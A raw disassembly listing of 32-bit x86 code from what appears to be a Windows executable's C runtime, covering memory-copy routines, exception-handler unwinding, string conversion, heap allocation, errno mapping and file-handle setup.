  405784:	mov    al,BYTE PTR [esi]
  405786:	mov    BYTE PTR [edi],al
  405788:	mov    al,BYTE PTR [esi+0x1]
  40578b:	mov    BYTE PTR [edi+0x1],al
  40578e:	mov    al,BYTE PTR [esi+0x2]
  405791:	mov    BYTE PTR [edi+0x2],al
  405794:	mov    eax,DWORD PTR [ebp+0x8]
  405797:	pop    esi
  405798:	pop    edi
  405799:	leave  
  40579a:	ret    
  40579b:	nop
  40579c:	lea    esi,[ecx+esi*1-0x4]
  4057a0:	lea    edi,[ecx+edi*1-0x4]
  4057a4:	test   edi,0x3
  4057aa:	jne    0x4057d0
  4057ac:	shr    ecx,0x2
  4057af:	and    edx,0x3
  4057b2:	cmp    ecx,0x8
  4057b5:	jb     0x4057c4
  4057b7:	std    
  4057b8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ba:	cld    
  4057bb:	jmp    DWORD PTR [edx*4+0x4058e8]
  4057c2:	mov    edi,edi
  4057c4:	neg    ecx
  4057c6:	jmp    DWORD PTR [ecx*4+0x405898]
  4057cd:	lea    ecx,[ecx+0x0]
  4057d0:	mov    eax,edi
  4057d2:	mov    edx,0x3
  4057d7:	cmp    ecx,0x4
  4057da:	jb     0x4057e8
  4057dc:	and    eax,0x3
  4057df:	sub    ecx,eax
  4057e1:	jmp    DWORD PTR [eax*4+0x4057ec]
  4057e8:	jmp    DWORD PTR [ecx*4+0x4058e8]
  4057ef:	nop
  4057f0:	cld    
  4057f1:	push   edi
  4057f2:	inc    eax
  4057f3:	add    BYTE PTR [eax],ah
  4057f5:	pop    eax
  4057f6:	inc    eax
  4057f7:	add    BYTE PTR [eax+0x58],cl
  4057fa:	inc    eax
  4057fb:	add    BYTE PTR [edx-0x2edcfcba],cl
  405801:	mov    BYTE PTR [edi+0x3],al
  405804:	sub    esi,0x1
  405807:	shr    ecx,0x2
  40580a:	sub    edi,0x1
  40580d:	cmp    ecx,0x8
  405810:	jb     0x4057c4
  405812:	std    
  405813:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405815:	cld    
  405816:	jmp    DWORD PTR [edx*4+0x4058e8]
  40581d:	lea    ecx,[ecx+0x0]
  405820:	mov    al,BYTE PTR [esi+0x3]
  405823:	and    edx,ecx
  405825:	mov    BYTE PTR [edi+0x3],al
  405828:	mov    al,BYTE PTR [esi+0x2]
  40582b:	shr    ecx,0x2
  40582e:	mov    BYTE PTR [edi+0x2],al
  405831:	sub    esi,0x2
  405834:	sub    edi,0x2
  405837:	cmp    ecx,0x8
  40583a:	jb     0x4057c4
  40583c:	std    
  40583d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40583f:	cld    
  405840:	jmp    DWORD PTR [edx*4+0x4058e8]
  405847:	nop
  405848:	mov    al,BYTE PTR [esi+0x3]
  40584b:	and    edx,ecx
  40584d:	mov    BYTE PTR [edi+0x3],al
  405850:	mov    al,BYTE PTR [esi+0x2]
  405853:	mov    BYTE PTR [edi+0x2],al
  405856:	mov    al,BYTE PTR [esi+0x1]
  405859:	shr    ecx,0x2
  40585c:	mov    BYTE PTR [edi+0x1],al
  40585f:	sub    esi,0x3
  405862:	sub    edi,0x3
  405865:	cmp    ecx,0x8
  405868:	jb     0x4057c4
  40586e:	std    
  40586f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405871:	cld    
  405872:	jmp    DWORD PTR [edx*4+0x4058e8]
  405879:	lea    ecx,[ecx+0x0]
  40587c:	pushf  
  40587d:	pop    eax
  40587e:	inc    eax
  40587f:	add    BYTE PTR [eax+ebx*2+0x58ac0040],ah
  405886:	inc    eax
  405887:	add    BYTE PTR [eax+ebx*2+0x58bc0040],dh
  40588e:	inc    eax
  40588f:	add    ah,al
  405891:	pop    eax
  405892:	inc    eax
  405893:	add    ah,cl
  405895:	pop    eax
  405896:	inc    eax
  405897:	add    bh,bl
  405899:	pop    eax
  40589a:	inc    eax
  40589b:	add    BYTE PTR [ebx-0x76e371bc],cl
  4058a1:	inc    esp
  4058a2:	(bad)  
  4058a3:	sbb    al,0x8b
  4058a5:	inc    esp
  4058a6:	mov    ds,WORD PTR [eax]
  4058a8:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  4058ac:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4058b0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4058b4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4058b8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4058bc:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4058c0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4058c4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4058c8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4058cc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4058d0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4058d4:	lea    eax,[ecx*4+0x0]
  4058db:	add    esi,eax
  4058dd:	add    edi,eax
  4058df:	jmp    DWORD PTR [edx*4+0x4058e8]
  4058e6:	mov    edi,edi
  4058e8:	clc    
  4058e9:	pop    eax
  4058ea:	inc    eax
  4058eb:	add    BYTE PTR [eax],al
  4058ed:	pop    ecx
  4058ee:	inc    eax
  4058ef:	add    BYTE PTR [eax],dl
  4058f1:	pop    ecx
  4058f2:	inc    eax
  4058f3:	add    BYTE PTR [ecx+ebx*2],ah
  4058f6:	inc    eax
  4058f7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4058fd:	leave  
  4058fe:	ret    
  4058ff:	nop
  405900:	mov    al,BYTE PTR [esi+0x3]
  405903:	mov    BYTE PTR [edi+0x3],al
  405906:	mov    eax,DWORD PTR [ebp+0x8]
  405909:	pop    esi
  40590a:	pop    edi
  40590b:	leave  
  40590c:	ret    
  40590d:	lea    ecx,[ecx+0x0]
  405910:	mov    al,BYTE PTR [esi+0x3]
  405913:	mov    BYTE PTR [edi+0x3],al
  405916:	mov    al,BYTE PTR [esi+0x2]
  405919:	mov    BYTE PTR [edi+0x2],al
  40591c:	mov    eax,DWORD PTR [ebp+0x8]
  40591f:	pop    esi
  405920:	pop    edi
  405921:	leave  
  405922:	ret    
  405923:	nop
  405924:	mov    al,BYTE PTR [esi+0x3]
  405927:	mov    BYTE PTR [edi+0x3],al
  40592a:	mov    al,BYTE PTR [esi+0x2]
  40592d:	mov    BYTE PTR [edi+0x2],al
  405930:	mov    al,BYTE PTR [esi+0x1]
  405933:	mov    BYTE PTR [edi+0x1],al
  405936:	mov    eax,DWORD PTR [ebp+0x8]
  405939:	pop    esi
  40593a:	pop    edi
  40593b:	leave  
  40593c:	ret    
  40593d:	int3   
  40593e:	int3   
  40593f:	int3   
  405940:	push   ebp
  405941:	mov    ebp,esp
  405943:	push   ebx
  405944:	push   esi
  405945:	push   edi
  405946:	push   ebp
  405947:	push   0x0
  405949:	push   0x0
  40594b:	push   0x405958
  405950:	push   DWORD PTR [ebp+0x8]
  405953:	call   0x406548
  405958:	pop    ebp
  405959:	pop    edi
  40595a:	pop    esi
  40595b:	pop    ebx
  40595c:	mov    esp,ebp
  40595e:	pop    ebp
  40595f:	ret    
  405960:	mov    ecx,DWORD PTR [esp+0x4]
  405964:	test   DWORD PTR [ecx+0x4],0x6
  40596b:	mov    eax,0x1
  405970:	je     0x405981
  405972:	mov    eax,DWORD PTR [esp+0x8]
  405976:	mov    edx,DWORD PTR [esp+0x10]
  40597a:	mov    DWORD PTR [edx],eax
  40597c:	mov    eax,0x3
  405981:	ret    
  405982:	push   ebx
  405983:	push   esi
  405984:	push   edi
  405985:	mov    eax,DWORD PTR [esp+0x10]
  405989:	push   eax
  40598a:	push   0xfffffffe
  40598c:	push   0x405960
  405991:	push   DWORD PTR fs:0x0
  405998:	mov    DWORD PTR fs:0x0,esp
  40599f:	mov    eax,DWORD PTR [esp+0x20]
  4059a3:	mov    ebx,DWORD PTR [eax+0x8]
  4059a6:	mov    esi,DWORD PTR [eax+0xc]
  4059a9:	cmp    esi,0xffffffff
  4059ac:	je     0x4059dc
  4059ae:	cmp    esi,DWORD PTR [esp+0x24]
  4059b2:	je     0x4059dc
  4059b4:	lea    esi,[esi+esi*2]
  4059b7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4059ba:	mov    DWORD PTR [esp+0x8],ecx
  4059be:	mov    DWORD PTR [eax+0xc],ecx
  4059c1:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  4059c6:	jne    0x4059da
  4059c8:	push   0x101
  4059cd:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  4059d1:	call   0x405a16
  4059d6:	call   DWORD PTR [ebx+esi*4+0x8]
  4059da:	jmp    0x40599f
  4059dc:	pop    DWORD PTR fs:0x0
  4059e3:	add    esp,0xc
  4059e6:	pop    edi
  4059e7:	pop    esi
  4059e8:	pop    ebx
  4059e9:	ret    
  4059ea:	xor    eax,eax
  4059ec:	mov    ecx,DWORD PTR fs:0x0
  4059f3:	cmp    DWORD PTR [ecx+0x4],0x405960
  4059fa:	jne    0x405a0c
  4059fc:	mov    edx,DWORD PTR [ecx+0xc]
  4059ff:	mov    edx,DWORD PTR [edx+0xc]
  405a02:	cmp    DWORD PTR [ecx+0x8],edx
  405a05:	jne    0x405a0c
  405a07:	mov    eax,0x1
  405a0c:	ret    
  405a0d:	push   ebx
  405a0e:	push   ecx
  405a0f:	mov    ebx,0x4283b0
  405a14:	jmp    0x405a20
  405a16:	push   ebx
  405a17:	push   ecx
  405a18:	mov    ebx,0x4283b0
  405a1d:	mov    ecx,DWORD PTR [ebp+0x8]
  405a20:	mov    DWORD PTR [ebx+0x8],ecx
  405a23:	mov    DWORD PTR [ebx+0x4],eax
  405a26:	mov    DWORD PTR [ebx+0xc],ebp
  405a29:	pop    ecx
  405a2a:	pop    ebx
  405a2b:	ret    0x4
  405a2e:	push   ebp
  405a2f:	mov    ebp,esp
  405a31:	sub    esp,0xc
  405a34:	mov    eax,ds:0x4282a8
  405a39:	xor    eax,DWORD PTR [ebp+0x4]
  405a3c:	and    BYTE PTR [ebp-0x6],0x0
  405a40:	push   0x6
  405a42:	mov    DWORD PTR [ebp-0x4],eax
  405a45:	lea    eax,[ebp-0xc]
  405a48:	push   eax
  405a49:	push   0x1004
  405a4e:	push   DWORD PTR [ebp+0x8]
  405a51:	call   DWORD PTR ds:0x42603c
  405a57:	test   eax,eax
  405a59:	jne    0x405a60
  405a5b:	or     eax,0xffffffff
  405a5e:	jmp    0x405a6a
  405a60:	lea    eax,[ebp-0xc]
  405a63:	push   eax
  405a64:	call   0x405e66
  405a69:	pop    ecx
  405a6a:	mov    ecx,DWORD PTR [ebp-0x4]
  405a6d:	xor    ecx,DWORD PTR [ebp+0x4]
  405a70:	call   0x403606
  405a75:	leave  
  405a76:	ret    
  405a77:	push   0x38
  405a79:	push   0x426b68
  405a7e:	call   0x4030a4
  405a83:	mov    eax,ds:0x4282a8
  405a88:	xor    eax,DWORD PTR [ebp+0x4]
  405a8b:	mov    DWORD PTR [ebp-0x1c],eax
  405a8e:	xor    edi,edi
  405a90:	mov    DWORD PTR [ebp-0x20],edi
  405a93:	mov    DWORD PTR [ebp-0x24],edi
  405a96:	mov    eax,DWORD PTR [ebp+0x14]
  405a99:	mov    ebx,DWORD PTR [eax]
  405a9b:	mov    DWORD PTR [ebp-0x28],ebx
  405a9e:	mov    DWORD PTR [ebp-0x2c],edi
  405aa1:	mov    eax,DWORD PTR [ebp+0x8]
  405aa4:	cmp    eax,DWORD PTR [ebp+0xc]
  405aa7:	je     0x405c20
  405aad:	lea    ecx,[ebp-0x40]
  405ab0:	push   ecx
  405ab1:	push   eax
  405ab2:	mov    esi,DWORD PTR ds:0x4260bc
  405ab8:	call   esi
  405aba:	test   eax,eax
  405abc:	je     0x405ade
  405abe:	cmp    DWORD PTR [ebp-0x40],0x1
  405ac2:	jne    0x405ade
  405ac4:	lea    eax,[ebp-0x40]
  405ac7:	push   eax
  405ac8:	push   DWORD PTR [ebp+0xc]
  405acb:	call   esi
  405acd:	test   eax,eax
  405acf:	je     0x405ade
  405ad1:	cmp    DWORD PTR [ebp-0x40],0x1
  405ad5:	jne    0x405ade
  405ad7:	mov    DWORD PTR [ebp-0x2c],0x1
  405ade:	cmp    DWORD PTR [ebp-0x2c],edi
  405ae1:	je     0x405afd
  405ae3:	cmp    ebx,0xffffffff
  405ae6:	je     0x405aec
  405ae8:	mov    esi,ebx
  405aea:	jmp    0x405af8
  405aec:	push   DWORD PTR [ebp+0x10]
  405aef:	call   0x403a40
  405af4:	pop    ecx
  405af5:	mov    esi,eax
  405af7:	inc    esi
  405af8:	mov    DWORD PTR [ebp-0x44],esi
  405afb:	jmp    0x405b00
  405afd:	mov    esi,DWORD PTR [ebp-0x44]
  405b00:	cmp    DWORD PTR [ebp-0x2c],edi
  405b03:	jne    0x405b1f
  405b05:	push   edi
  405b06:	push   edi
  405b07:	push   ebx
  405b08:	push   DWORD PTR [ebp+0x10]
  405b0b:	push   0x1
  405b0d:	push   DWORD PTR [ebp+0x8]
  405b10:	call   DWORD PTR ds:0x42609c
  405b16:	mov    esi,eax
  405b18:	mov    DWORD PTR [ebp-0x44],esi
  405b1b:	cmp    esi,edi
  405b1d:	je     0x405b77
  405b1f:	mov    DWORD PTR [ebp-0x4],edi
  405b22:	lea    eax,[esi+esi*1]
  405b25:	add    eax,0x3
  405b28:	and    eax,0xfffffffc
  405b2b:	call   0x4030f0
  405b30:	mov    DWORD PTR [ebp-0x18],esp
  405b33:	mov    ebx,esp
  405b35:	mov    DWORD PTR [ebp-0x48],ebx
  405b38:	lea    eax,[esi+esi*1]
  405b3b:	push   eax
  405b3c:	push   edi
  405b3d:	push   ebx
  405b3e:	call   0x403420
  405b43:	add    esp,0xc
  405b46:	or     DWORD PTR [ebp-0x4],0xffffffff
  405b4a:	jmp    0x405b63
  405b4c:	xor    eax,eax
  405b4e:	inc    eax
  405b4f:	ret    
  405b50:	mov    esp,DWORD PTR [ebp-0x18]
  405b53:	call   0x403504
  405b58:	xor    edi,edi
  405b5a:	xor    ebx,ebx
  405b5c:	or     DWORD PTR [ebp-0x4],0xffffffff
  405b60:	mov    esi,DWORD PTR [ebp-0x44]
  405b63:	cmp    ebx,edi
  405b65:	jne    0x405b85
  405b67:	push   esi
  405b68:	push   0x2
  405b6a:	call   0x405c46
  405b6f:	pop    ecx
  405b70:	pop    ecx
  405b71:	mov    ebx,eax
  405b73:	cmp    ebx,edi
  405b75:	jne    0x405b7e
  405b77:	xor    eax,eax
  405b79:	jmp    0x405c32
  405b7e:	mov    DWORD PTR [ebp-0x24],0x1
  405b85:	push   esi
  405b86:	push   ebx
  405b87:	push   DWORD PTR [ebp-0x28]
  405b8a:	push   DWORD PTR [ebp+0x10]
  405b8d:	push   0x1
  405b8f:	push   DWORD PTR [ebp+0x8]
  405b92:	call   DWORD PTR ds:0x42609c
  405b98:	test   eax,eax
  405b9a:	je     0x405c23
  405ba0:	cmp    DWORD PTR [ebp+0x18],edi
  405ba3:	je     0x405bc5
  405ba5:	push   edi
  405ba6:	push   edi
  405ba7:	push   DWORD PTR [ebp+0x1c]
  405baa:	push   DWORD PTR [ebp+0x18]
  405bad:	push   esi
  405bae:	push   ebx
  405baf:	push   edi
  405bb0:	push   DWORD PTR [ebp+0xc]
  405bb3:	call   DWORD PTR ds:0x426080
  405bb9:	test   eax,eax
  405bbb:	je     0x405c23
  405bbd:	mov    eax,DWORD PTR [ebp+0x18]
  405bc0:	mov    DWORD PTR [ebp-0x20],eax
  405bc3:	jmp    0x405c23
  405bc5:	cmp    DWORD PTR [ebp-0x2c],edi
  405bc8:	jne    0x405be0
  405bca:	push   edi
  405bcb:	push   edi
  405bcc:	push   edi
  405bcd:	push   edi
  405bce:	push   esi
  405bcf:	push   ebx
  405bd0:	push   edi
  405bd1:	push   DWORD PTR [ebp+0xc]
  405bd4:	call   DWORD PTR ds:0x426080
  405bda:	mov    esi,eax
  405bdc:	cmp    esi,edi
  405bde:	je     0x405c23
  405be0:	push   esi
  405be1:	push   0x1
  405be3:	call   0x405c46
  405be8:	pop    ecx
  405be9:	pop    ecx
  405bea:	mov    DWORD PTR [ebp-0x20],eax
  405bed:	cmp    eax,edi
  405bef:	je     0x405c23
  405bf1:	push   edi
  405bf2:	push   edi
  405bf3:	push   esi
  405bf4:	push   eax
  405bf5:	push   esi
  405bf6:	push   ebx
  405bf7:	push   edi
  405bf8:	push   DWORD PTR [ebp+0xc]
  405bfb:	call   DWORD PTR ds:0x426080
  405c01:	cmp    eax,edi
  405c03:	jne    0x405c13
  405c05:	push   DWORD PTR [ebp-0x20]
  405c08:	call   0x40331e
  405c0d:	pop    ecx
  405c0e:	mov    DWORD PTR [ebp-0x20],edi
  405c11:	jmp    0x405c23
  405c13:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  405c17:	je     0x405c23
  405c19:	mov    ecx,DWORD PTR [ebp+0x14]
  405c1c:	mov    DWORD PTR [ecx],eax
  405c1e:	jmp    0x405c23
  405c20:	mov    ebx,DWORD PTR [ebp-0x48]
  405c23:	cmp    DWORD PTR [ebp-0x24],edi
  405c26:	je     0x405c2f
  405c28:	push   ebx
  405c29:	call   0x40331e
  405c2e:	pop    ecx
  405c2f:	mov    eax,DWORD PTR [ebp-0x20]
  405c32:	lea    esp,[ebp-0x54]
  405c35:	mov    ecx,DWORD PTR [ebp-0x1c]
  405c38:	xor    ecx,DWORD PTR [ebp+0x4]
  405c3b:	call   0x403606
  405c40:	call   0x4030df
  405c45:	ret    
  405c46:	push   ebx
  405c47:	push   esi
  405c48:	mov    esi,DWORD PTR [esp+0xc]
  405c4c:	imul   esi,DWORD PTR [esp+0x10]
  405c51:	test   esi,esi
  405c53:	push   edi
  405c54:	mov    ebx,esi
  405c56:	jne    0x405c59
  405c58:	inc    esi
  405c59:	xor    edi,edi
  405c5b:	cmp    esi,0xffffffe0
  405c5e:	ja     0x405c99
  405c60:	cmp    DWORD PTR ds:0x429c04,0x3
  405c67:	jne    0x405c84
  405c69:	add    esi,0xf
  405c6c:	and    esi,0xfffffff0
  405c6f:	cmp    ebx,DWORD PTR ds:0x4299b0
  405c75:	ja     0x405c84
  405c77:	push   ebx
  405c78:	call   0x404728
  405c7d:	mov    edi,eax
  405c7f:	test   edi,edi
  405c81:	pop    ecx
  405c82:	jne    0x405caf
  405c84:	push   esi
  405c85:	push   0x8
  405c87:	push   DWORD PTR ds:0x429c00
  405c8d:	call   DWORD PTR ds:0x4260a0
  405c93:	mov    edi,eax
  405c95:	test   edi,edi
  405c97:	jne    0x405cbb
  405c99:	cmp    DWORD PTR ds:0x428974,0x0
  405ca0:	je     0x405cbb
  405ca2:	push   esi
  405ca3:	call   0x404ee2
  405ca8:	test   eax,eax
  405caa:	pop    ecx
  405cab:	jne    0x405c59
  405cad:	jmp    0x405cbd
  405caf:	push   ebx
  405cb0:	push   0x0
  405cb2:	push   edi
  405cb3:	call   0x403420
  405cb8:	add    esp,0xc
  405cbb:	mov    eax,edi
  405cbd:	pop    edi
  405cbe:	pop    esi
  405cbf:	pop    ebx
  405cc0:	ret    
  405cc1:	mov    eax,DWORD PTR [esp+0x4]
  405cc5:	cmp    eax,DWORD PTR ds:0x429c08
  405ccb:	push   ebx
  405ccc:	push   esi
  405ccd:	push   edi
  405cce:	jae    0x405d35
  405cd0:	mov    ecx,eax
  405cd2:	sar    ecx,0x5
  405cd5:	mov    esi,eax
  405cd7:	and    esi,0x1f
  405cda:	lea    edi,[ecx*4+0x429c20]
  405ce1:	mov    ecx,DWORD PTR [edi]
  405ce3:	shl    esi,0x3
  405ce6:	test   BYTE PTR [ecx+esi*1+0x4],0x1
  405ceb:	je     0x405d35
  405ced:	push   eax
  405cee:	call   0x405f38
  405cf3:	cmp    eax,0xffffffff
  405cf6:	pop    ecx
  405cf7:	je     0x405d3c
  405cf9:	push   DWORD PTR [esp+0x18]
  405cfd:	push   0x0
  405cff:	push   DWORD PTR [esp+0x1c]
  405d03:	push   eax
  405d04:	call   DWORD PTR ds:0x426038
  405d0a:	mov    ebx,eax
  405d0c:	cmp    ebx,0xffffffff
  405d0f:	jne    0x405d19
  405d11:	call   DWORD PTR ds:0x426018
  405d17:	jmp    0x405d1b
  405d19:	xor    eax,eax
  405d1b:	test   eax,eax
  405d1d:	je     0x405d28
  405d1f:	push   eax
  405d20:	call   0x405d4d
  405d25:	pop    ecx
  405d26:	jmp    0x405d46
  405d28:	mov    eax,DWORD PTR [edi]
  405d2a:	lea    eax,[eax+esi*1+0x4]
  405d2e:	and    BYTE PTR [eax],0xfd
  405d31:	mov    eax,ebx
  405d33:	jmp    0x405d49
  405d35:	and    DWORD PTR ds:0x4287d0,0x0
  405d3c:	mov    DWORD PTR ds:0x4287cc,0x9
  405d46:	or     eax,0xffffffff
  405d49:	pop    edi
  405d4a:	pop    esi
  405d4b:	pop    ebx
  405d4c:	ret    
  405d4d:	mov    eax,DWORD PTR [esp+0x4]
  405d51:	mov    ds:0x4287d0,eax
  405d56:	xor    ecx,ecx
  405d58:	cmp    eax,DWORD PTR [ecx*8+0x4283c0]
  405d5f:	je     0x405d7c
  405d61:	inc    ecx
  405d62:	cmp    ecx,0x2d
  405d65:	jb     0x405d58
  405d67:	cmp    eax,0x13
  405d6a:	jb     0x405d89
  405d6c:	cmp    eax,0x24
  405d6f:	ja     0x405d89
  405d71:	mov    DWORD PTR ds:0x4287cc,0xd
  405d7b:	ret    
  405d7c:	mov    eax,DWORD PTR [ecx*8+0x4283c4]
  405d83:	mov    ds:0x4287cc,eax
  405d88:	ret    
  405d89:	cmp    eax,0xbc
  405d8e:	jb     0x405da1
  405d90:	cmp    eax,0xca
  405d95:	mov    DWORD PTR ds:0x4287cc,0x8
  405d9f:	jbe    0x405dab
  405da1:	mov    DWORD PTR ds:0x4287cc,0x16
  405dab:	ret    
  405dac:	mov    eax,ds:0x4299a0
  405db1:	test   eax,eax
  405db3:	push   esi
  405db4:	push   0x14
  405db6:	pop    esi
  405db7:	jne    0x405dc0
  405db9:	mov    eax,0x200
  405dbe:	jmp    0x405dc6
  405dc0:	cmp    eax,esi
  405dc2:	jge    0x405dcb
  405dc4:	mov    eax,esi
  405dc6:	mov    ds:0x4299a0,eax
  405dcb:	push   0x4
  405dcd:	push   eax
  405dce:	call   0x405c46
  405dd3:	test   eax,eax
  405dd5:	pop    ecx
  405dd6:	pop    ecx
  405dd7:	mov    ds:0x428984,eax
  405ddc:	jne    0x405dfc
  405dde:	push   0x4
  405de0:	push   esi
  405de1:	mov    DWORD PTR ds:0x4299a0,esi
  405de7:	call   0x405c46
  405dec:	test   eax,eax
  405dee:	pop    ecx
  405def:	pop    ecx
  405df0:	mov    ds:0x428984,eax
  405df5:	jne    0x405dfc
  405df7:	push   0x1a
  405df9:	pop    eax
  405dfa:	pop    esi
  405dfb:	ret    
  405dfc:	xor    edx,edx
  405dfe:	mov    ecx,0x428528
  405e03:	jmp    0x405e0a
  405e05:	mov    eax,ds:0x428984
  405e0a:	mov    DWORD PTR [edx+eax*1],ecx
  405e0d:	add    ecx,0x20
  405e10:	add    edx,0x4
  405e13:	cmp    ecx,0x4287a8
  405e19:	jl     0x405e05
  405e1b:	xor    edx,edx
  405e1d:	mov    ecx,0x428538
  405e22:	mov    eax,edx
  405e24:	sar    eax,0x5
  405e27:	mov    eax,DWORD PTR [eax*4+0x429c20]
  405e2e:	mov    esi,edx
  405e30:	and    esi,0x1f
  405e33:	mov    eax,DWORD PTR [eax+esi*8]
  405e36:	cmp    eax,0xffffffff
  405e39:	je     0x405e3f
  405e3b:	test   eax,eax
  405e3d:	jne    0x405e42
  405e3f:	or     DWORD PTR [ecx],0xffffffff
  405e42:	add    ecx,0x20
  405e45:	inc    edx
  405e46:	cmp    ecx,0x428598
  405e4c:	jl     0x405e22
  405e4e:	xor    eax,eax
  405e50:	pop    esi
  405e51:	ret    
  405e52:	call   0x4060d1
  405e57:	cmp    BYTE PTR ds:0x428810,0x0
  405e5e:	je     0x405e65
  405e60:	jmp    0x405f74
  405e65:	ret    
  405e66:	push   esi
  405e67:	mov    esi,DWORD PTR [esp+0x8]
  405e6b:	jmp    0x405e6e
  405e6d:	inc    esi
  405e6e:	movzx  eax,BYTE PTR [esi]
  405e71:	push   eax
  405e72:	call   0x4060da
  405e77:	test   eax,eax
  405e79:	pop    ecx
  405e7a:	jne    0x405e6d
  405e7c:	movzx  ecx,BYTE PTR [esi]
  405e7f:	inc    esi
  405e80:	cmp    ecx,0x2d
  405e83:	mov    edx,ecx
  405e85:	je     0x405e8c
  405e87:	cmp    ecx,0x2b
  405e8a:	jne    0x405e90
  405e8c:	movzx  ecx,BYTE PTR [esi]
  405e8f:	inc    esi
  405e90:	xor    eax,eax
  405e92:	cmp    ecx,0x30
  405e95:	jl     0x405ea1
  405e97:	cmp    ecx,0x39
  405e9a:	jg     0x405ea1
  405e9c:	sub    ecx,0x30
  405e9f:	jmp    0x405ea4
  405ea1:	or     ecx,0xffffffff
  405ea4:	cmp    ecx,0xffffffff
  405ea7:	je     0x405eb5
  405ea9:	lea    eax,[eax+eax*4]
  405eac:	lea    eax,[ecx+eax*2]
  405eaf:	movzx  ecx,BYTE PTR [esi]
  405eb2:	inc    esi
  405eb3:	jmp    0x405e92
  405eb5:	cmp    edx,0x2d
  405eb8:	pop    esi
  405eb9:	jne    0x405ebd
  405ebb:	neg    eax
  405ebd:	ret    
  405ebe:	mov    ecx,DWORD PTR [esp+0x4]
  405ec2:	cmp    ecx,DWORD PTR ds:0x429c08
  405ec8:	push   esi
  405ec9:	push   edi
  405eca:	jae    0x405f21
  405ecc:	mov    eax,ecx
  405ece:	sar    eax,0x5
  405ed1:	mov    esi,ecx
  405ed3:	lea    edi,[eax*4+0x429c20]
  405eda:	mov    eax,DWORD PTR [edi]
  405edc:	and    esi,0x1f
  405edf:	shl    esi,0x3
  405ee2:	add    eax,esi
  405ee4:	test   BYTE PTR [eax+0x4],0x1
  405ee8:	je     0x405f21
  405eea:	cmp    DWORD PTR [eax],0xffffffff
  405eed:	je     0x405f21
  405eef:	cmp    DWORD PTR ds:0x428144,0x1
  405ef6:	jne    0x405f17
  405ef8:	xor    eax,eax
  405efa:	sub    ecx,eax
  405efc:	je     0x405f0e
  405efe:	dec    ecx
  405eff:	je     0x405f09
  405f01:	dec    ecx
  405f02:	jne    0x405f17
  405f04:	push   eax
  405f05:	push   0xfffffff4
  405f07:	jmp    0x405f11
  405f09:	push   eax
  405f0a:	push   0xfffffff5
  405f0c:	jmp    0x405f11
  405f0e:	push   eax
  405f0f:	push   0xfffffff6
  405f11:	call   DWORD PTR ds:0x426034
  405f17:	mov    eax,DWORD PTR [edi]
  405f19:	or     DWORD PTR [esi+eax*1],0xffffffff
  405f1d:	xor    eax,eax
  405f1f:	jmp    0x405f35
  405f21:	and    DWORD PTR ds:0x4287d0,0x0
  405f28:	mov    DWORD PTR ds:0x4287cc,0x9
  405f32:	or     eax,0xffffffff
  405f35:	pop    edi
  405f36:	pop    esi
  405f37:	ret    
  405f38:	mov    eax,DWORD PTR [esp+0x4]
  405f3c:	cmp    eax,DWORD PTR ds:0x429c08
  405f42:	jae    0x405f5f
  405f44:	mov    ecx,eax
  405f46:	sar    ecx,0x5
  405f49:	mov    ecx,DWORD PTR [ecx*4+0x429c20]
  405f50:	and    eax,0x1f
  405f53:	lea    eax,[ecx+eax*8]
  405f56:	test   BYTE PTR [eax+0x4],0x1
  405f5a:	je     0x405f5f
  405f5c:	mov    eax,DWORD PTR [eax]
  405f5e:	ret    
  405f5f:	and    DWORD PTR ds:0x4287d0,0x0
  405f66:	mov    DWORD PTR ds:0x4287cc,0x9
  405f70:	or     eax,0xffffffff
  405f73:	ret    
  405f74:	push   esi
  405f75:	push   edi
  405f76:	push   0x3
  405f78:	pop    esi
  405f79:	xor    edi,edi
  405f7b:	cmp    DWORD PTR ds:0x4299a0,esi
  405f81:	jle    0x405fc7
  405f83:	mov    eax,ds:0x428984
  405f88:	mov    eax,DWORD PTR [eax+esi*4]
  405f8b:	test   eax,eax
  405f8d:	je     0x405fbe
  405f8f:	test   BYTE PTR [eax+0xc],0x83
  405f93:	je     0x405fa2
  405f95:	push   eax
  405f96:	call   0x40616a
  405f9b:	cmp    eax,0xffffffff
  405f9e:	pop    ecx
  405f9f:	je     0x405fa2
  405fa1:	inc    edi
  405fa2:	cmp    esi,0x14
  405fa5:	jl     0x405fbe
  405fa7:	mov    eax,ds:0x428984
  405fac:	push   DWORD PTR [eax+esi*4]
  405faf:	call   0x40331e
  405fb4:	mov    eax,ds:0x428984
  405fb9:	and    DWORD PTR [eax+esi*4],0x0
  405fbd:	pop    ecx
  405fbe:	inc    esi
  405fbf:	cmp    esi,DWORD PTR ds:0x4299a0
  405fc5:	jl     0x405f83
  405fc7:	mov    eax,edi
  405fc9:	pop    edi
  405fca:	pop    esi
  405fcb:	ret    
  405fcc:	push   ebx
  405fcd:	push   esi
  405fce:	mov    esi,DWORD PTR [esp+0xc]
  405fd2:	mov    eax,DWORD PTR [esi+0xc]
  405fd5:	mov    ecx,eax
  405fd7:	and    cl,0x3
  405fda:	xor    ebx,ebx
  405fdc:	cmp    cl,0x2
  405fdf:	jne    0x40601b
  405fe1:	test   ax,0x108
  405fe5:	je     0x40601b
  405fe7:	mov    eax,DWORD PTR [esi+0x8]
  405fea:	push   edi
  405feb:	mov    edi,DWORD PTR [esi]
  405fed:	sub    edi,eax
  405fef:	test   edi,edi
  405ff1:	jle    0x40601a
  405ff3:	push   edi
  405ff4:	push   eax
  405ff5:	push   DWORD PTR [esi+0x10]
  405ff8:	call   0x4061c0
  405ffd:	add    esp,0xc
